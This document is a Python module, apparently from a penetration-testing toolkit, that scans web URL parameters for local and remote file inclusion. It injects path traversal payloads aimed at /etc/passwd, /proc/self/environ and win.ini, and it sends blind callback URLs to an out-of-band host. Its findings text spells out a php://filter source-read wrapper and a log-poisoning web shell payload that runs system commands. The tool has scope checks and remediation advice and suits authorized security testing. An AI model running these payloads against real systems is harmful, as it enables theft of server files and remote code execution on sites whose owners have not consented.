"""PENTRIX ARSENAL module: LFI / RFI / path traversal prober.

Injects traversal and encoding variants targeting /etc/passwd,
/proc/self/environ and windows/win.ini canaries into URL query
parameters. Detects local file inclusion by canary content in the
response. Remote file inclusion is only tested as a blind callback
(when the run config provides one); otherwise it is reported as a
manual-test guidance finding with exact payloads. PHP wrapper and
log-poisoning notes are guidance-only, no code is executed.

Non-intrusive: a handful of GET requests per parameter.
"""

import time
import urllib.parse
from pathlib import Path
import json

from arsenal.findings import make_finding
from arsenal.http import fetch

NAME = "lfi"
DESCRIPTION = (
    "Probes URL parameters for local file inclusion and path traversal "
    "with canary files, encoding variants, blind RFI callbacks, and "
    "PHP wrapper / log-poisoning test guidance."
)
TARGET_KIND = "url"
INTRUSIVE = False

TIMEOUT = 10
MAX_PARAMS = 3

PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "../../../../etc/passwd%00",
    "../../../../proc/self/environ",
    "..\\..\\..\\windows\\win.ini",
]

CANARIES = {
    "unix-passwd": ("root:x:0:0", "root:*:0:0"),
    "win-ini": ("[extensions]", "[fonts]"),
    "environ": ("DOCUMENT_ROOT=", "PATH="),
}


def _timeout(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("timeout", TIMEOUT)
    if cfg is not None:
        return getattr(cfg, "timeout", TIMEOUT)
    return TIMEOUT


def _log(ctx, level, msg):
    log = getattr(ctx, "log", None)
    if log is None:
        return
    try:
        getattr(log, level, log.warning)(msg)
    except Exception:
        pass


def _is_http_url(target):
    try:
        parts = urllib.parse.urlsplit(target)
    except Exception:
        return False
    return parts.scheme in ("http", "https") and bool(parts.netloc)


def _host_of(url):
    try:
        return urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return ""


def _in_scope(target, ctx):
    scope = getattr(ctx, "scope", None)
    if scope is None:
        return True
    try:
        return bool(scope.contains(_host_of(target)))
    except Exception:
        return True


def _finding(**kwargs):
    kwargs.setdefault("module", NAME)
    return make_finding(**kwargs)


def _params(url):
    try:
        return urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query,
                                      keep_blank_values=True)
    except Exception:
        return []


def _with_param(url, idx, new_value):
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q[idx] = (q[idx][0], new_value)
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(q), parts.fragment))


def _blind_base(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("blind_base") or cfg.get("oob_base")
    return getattr(ctx, "blind_base", None)


def _inbox_hits(tag, since):
    path = Path.home() / ".arsenal" / "inbox.jsonl"
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
    except Exception:
        return False
    for line in lines[-200:]:
        try:
            rec = json.loads(line)
        except Exception:
            continue
        hay = "%s %s" % (rec.get("path", ""), rec.get("query", ""))
        if tag in hay and str(rec.get("ts", "")) >= since:
            return True
    return False


def _fetch(url, ctx):
    try:
        return fetch(url, timeout=_timeout(ctx), allow_redirects=True, ctx=ctx)
    except Exception as exc:
        _log(ctx, "debug", "%s: request failed for %s: %s" % (NAME, url, exc))
        return None


def _body_text(resp):
    _status, _headers, body, _final = resp
    try:
        return body.decode("utf-8", errors="replace")
    except Exception:
        return ""


def _match_canary(text):
    for label, markers in CANARIES.items():
        for marker in markers:
            if marker in text:
                return label, marker
    return None, None


def run(target, ctx):
    """Probe URL parameters for LFI / path traversal."""
    try:
        return _run(target, ctx)
    except Exception as exc:
        _log(ctx, "warning", "%s failed on %s: %s" % (NAME, target, exc))
        return []


def _run(target, ctx):
    if not _is_http_url(target):
        return []
    if not _in_scope(target, ctx):
        _log(ctx, "warning", "%s: target out of scope: %s" % (NAME, target))
        return []
    params = _params(target)
    if not params:
        return []
    findings = []
    base = _blind_base(ctx)

    baseline_resp = _fetch(target, ctx)
    baseline_text = _body_text(baseline_resp) if baseline_resp else ""
    since = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime())
    confirmed = False
    rfi_tags = []

    for idx, (pname, _pval) in enumerate(params[:MAX_PARAMS]):
        for payload in PAYLOADS:
            probe_url = _with_param(target, idx, payload)
            resp = _fetch(probe_url, ctx)
            if resp is None:
                continue
            text = _body_text(resp)
            label, marker = _match_canary(text)
            if label and marker not in baseline_text:
                confirmed = True
                findings.append(_finding(
                    target=target,
                    severity="high",
                    title="Local file inclusion via %s (%s)" % (pname, label),
                    description=(
                        "The %s parameter reflected canary content from %s, "
                        "which proves the server read a local file path "
                        "controlled by the request." % (pname, label)),
                    evidence=(
                        "Request: %s\nCanary marker: %r\n"
                        "Response excerpt: %s"
                        % (probe_url, marker, text[:300].replace("\n", " "))),
                    confidence="strong",
                    cwe="CWE-22",
                    remediation=(
                        "Map user input to an allowlist of files; never pass "
                        "request input to filesystem calls. Canonicalize and "
                        "jail paths under one directory.")))
                break
        if base:
            tag = "rfi-%s-%d" % (pname, idx)
            cb = "%s/%s.txt" % (str(base).rstrip("/"), tag)
            probe_url = _with_param(target, idx, cb)
            _fetch(probe_url, ctx)
            rfi_tags.append((pname, tag, probe_url))

    if rfi_tags:
        time.sleep(5)
        for pname, tag, probe_url in rfi_tags:
            if _inbox_hits(tag, since):
                findings.append(_finding(
                    target=target,
                    severity="high",
                    title="Remote file inclusion: server fetched callback (%s)" % pname,
                    description=(
                        "The server made an outbound request for the remote "
                        "URL injected into %s, recorded in the arsenal inbox. "
                        "If the include path executes the fetched content, "
                        "this is RCE." % pname),
                    evidence=(
                        "Request: %s\nCallback-Tag: %s\n"
                        "Inbox hit recorded after injection."
                        % (probe_url, tag)),
                    confidence="strong",
                    cwe="CWE-98",
                    remediation="Disable remote includes (allow_url_include=off); allowlist."))

    if confirmed or any("file" in p[0].lower() or "page" in p[0].lower()
                        or "path" in p[0].lower() or "inc" in p[0].lower()
                        for p in params):
        findings.append(_finding(
            target=target,
            severity="info",
            title="LFI follow-up: PHP wrapper and log-poisoning payloads",
            description=(
                "Manual follow-ups when include-like behavior is suspected. "
                "PHP filter wrapper (reads source without execution): "
                "php://filter/convert.base64-encode/resource=index then "
                "base64-decode the response. Expect wrapper is legacy/RCE "
                "and must only be tested with authorization. Log poisoning: "
                "if the app logs the User-Agent and includes the log file, "
                "inject <?php system($_GET['c']); ?> via User-Agent, then "
                "request the log path through the LFI parameter."),
            evidence="Include-like parameter names seen: %s"
                    % ", ".join(p[0] for p in params[:MAX_PARAMS]),
            confidence="review",
            cwe="CWE-22",
            remediation="Same as LFI: allowlist file mapping; keep logs out of the web root."))

    if not confirmed and not rfi_tags:
        findings.append(_finding(
            target=target,
            severity="info",
            title="RFI not tested: no blind callback base configured",
            description=(
                "Remote file inclusion needs an out-of-band check. Re-run "
                "with a blind callback base (config key blind_base, e.g. "
                "the arsenal inbox listener) so the module can inject a "
                "unique remote URL per parameter and correlate hits."),
            evidence="blind_base not set in ctx config.",
            confidence="review",
            cwe="CWE-98",
            remediation="Provide blind_base to enable blind RFI correlation."))
    return findings
